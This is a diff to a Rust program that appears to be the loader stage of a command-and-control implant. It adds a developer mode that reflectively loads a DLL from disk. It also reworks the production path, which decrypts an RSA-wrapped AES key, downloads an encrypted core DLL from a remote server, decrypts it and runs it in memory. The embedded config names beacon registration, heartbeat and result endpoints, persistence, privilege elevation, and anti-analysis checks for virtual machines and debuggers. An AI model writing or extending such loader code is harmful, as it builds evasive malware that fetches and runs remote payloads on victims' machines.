@@ -18,7 +18,40 @@ fn main() {
 
     let args: Vec<String> = env::args().collect();
     let is_boot = args.iter().any(|a| a == "--boot");
-    log!("[2/10] args parsed, is_boot={}", is_boot);
+    let local_path = args.iter().position(|a| a == "--local").and_then(|i| args.get(i + 1)).cloned();
+    log!("[2/10] args parsed, is_boot={}, local={}", is_boot, local_path.is_some());
+
+    // Dev mode: --local <path> skips config injection, anti-analysis, elevation, persistence
+    if let Some(ref path) = local_path {
+        log!("[DEV] --local mode: loading {} directly", path);
+        let dll_bytes = match std::fs::read(path) {
+            Ok(b) => {
+                log!("[DEV] read {} bytes", b.len());
+                b
+            }
+            Err(e) => fatal_exit(&format!("[DEV] FAIL: read {}: {}", path, e)),
+        };
+
+        if dll_bytes.len() < 64 {
+            fatal_exit("[DEV] FAIL: DLL too small");
+        }
+
+        log!("[DEV] reflective_load...");
+        let entry_fn = match unsafe { pe_loader::reflective_load(&dll_bytes) } {
+            Ok(f) => {
+                log!("[DEV] reflective_load OK");
+                f
+            }
+            Err(e) => fatal_exit(&format!("[DEV] FAIL: reflective_load: {}", e)),
+        };
+
+        // Pass a minimal config JSON for dev
+        let dev_config = r#"{"server_url":"http://127.0.0.1:5000","register_path":"/api/beacon/register","heartbeat_path":"/api/beacon/heartbeat","result_path":"/api/beacon/result","ws_path":"/ws/agent","heartbeat_interval_ms":3000,"jitter_percent":0.2,"require_admin":false,"enable_persistence":false,"encrypted_aes_key":"","core_download_path":"","rsa_private_key":"","anti_analysis":{"enabled":false,"check_cpu_cores":false,"check_memory":false,"check_uptime":false,"check_parent_process":false,"check_vm_mac":false,"check_disk_size":false,"check_username":false,"check_debugger":false}}"#;
+        log!("[DEV] calling core_main ({} bytes config)...", dev_config.len());
+        entry_fn(dev_config.as_ptr(), dev_config.len());
+        log!("[DEV] core_main returned!");
+        std::process::exit(0);
+    }
 
     // 1. Parse injected config from binary
     log!("[3/10] parsing injected config...");
@@ -93,59 +126,45 @@ fn main() {
     }
     log!("[7/10] persistence done");
 
-    // 6. Load core DLL bytes
-    let dll_bytes = if let Some(local_path) = args.iter().position(|a| a == "--local").and_then(|i| args.get(i + 1)) {
-        // Dev mode: load core.dll directly from disk (skip download + decrypt)
-        log!("[8/10] --local mode: loading from {}", local_path);
-        match std::fs::read(local_path) {
-            Ok(bytes) => {
-                log!("[9/10] local load OK ({} bytes)", bytes.len());
-                bytes
-            }
-            Err(e) => fatal_exit(&format!("[8/10] FAIL: read {}: {}", local_path, e)),
+    // 6. Load core DLL bytes (production: download + decrypt)
+    log!("[8/10] decrypting AES key...");
+    let mut aes_key = match dll_fetch::decrypt_aes_key(&loader_cfg.encrypted_aes_key, &loader_cfg.rsa_private_key) {
+        Ok(k) => {
+            log!("[8/10] AES key decrypted OK ({} bytes)", k.len());
+            k
         }
-    } else {
-        // Production: decrypt AES key, download, decrypt core DLL
-        log!("[8/10] decrypting AES key...");
-        let mut aes_key = match dll_fetch::decrypt_aes_key(&loader_cfg.encrypted_aes_key, &loader_cfg.rsa_private_key) {
-            Ok(k) => {
-                log!("[8/10] AES key decrypted OK ({} bytes)", k.len());
-                k
-            }
-            Err(e) => fatal_exit(&format!("[8/10] FAIL: AES key decrypt: {}", e)),
-        };
-
-        let download_url = loader_cfg.download_url();
-        log!("[9/10] downloading core from {}...", download_url);
-
-        let aes_key_clone = aes_key.clone();
-        let download_result = std::thread::spawn(move || {
-            let rt = tokio::runtime::Builder::new_current_thread()
-                .enable_all()
-                .build()
-                .map_err(|e| format!("tokio runtime: {}", e))?;
-
-            let encrypted = rt.block_on(dll_fetch::download_core(&download_url))
-                .map_err(|e| format!("download: {}", e))?;
-
-            let decrypted = dll_fetch::decrypt_dll(&encrypted, &aes_key_clone)
-                .map_err(|e| format!("decrypt: {}", e))?;
-
-            Ok::<(Vec<u8>, usize), String>((decrypted, encrypted.len()))
-        }).join().unwrap_or(Err("download thread panic".into()));
-
-        let bytes = match download_result {
-            Ok((decrypted, enc_len)) => {
-                log!("[9/10] download OK ({} bytes), decrypt OK ({} bytes)", enc_len, decrypted.len());
-                decrypted
-            }
-            Err(e) => fatal_exit(&format!("[9/10] FAIL: {}", e)),
-        };
-
-        use zeroize::Zeroize;
-        aes_key.zeroize();
-        bytes
+        Err(e) => fatal_exit(&format!("[8/10] FAIL: AES key decrypt: {}", e)),
     };
+
+    let download_url = loader_cfg.download_url();
+    log!("[9/10] downloading core from {}...", download_url);
+
+    let aes_key_clone = aes_key.clone();
+    let download_result = std::thread::spawn(move || {
+        let rt = tokio::runtime::Builder::new_current_thread()
+            .enable_all()
+            .build()
+            .map_err(|e| format!("tokio runtime: {}", e))?;
+
+        let encrypted = rt.block_on(dll_fetch::download_core(&download_url))
+            .map_err(|e| format!("download: {}", e))?;
+
+        let decrypted = dll_fetch::decrypt_dll(&encrypted, &aes_key_clone)
+            .map_err(|e| format!("decrypt: {}", e))?;
+
+        Ok::<(Vec<u8>, usize), String>((decrypted, encrypted.len()))
+    }).join().unwrap_or(Err("download thread panic".into()));
+
+    let dll_bytes = match download_result {
+        Ok((decrypted, enc_len)) => {
+            log!("[9/10] download OK ({} bytes), decrypt OK ({} bytes)", enc_len, decrypted.len());
+            decrypted
+        }
+        Err(e) => fatal_exit(&format!("[9/10] FAIL: {}", e)),
+    };
+
+    use zeroize::Zeroize;
+    aes_key.zeroize();
 
     // 9. Validate PE header (basic sanity check)
     if dll_bytes.len() < 64 {
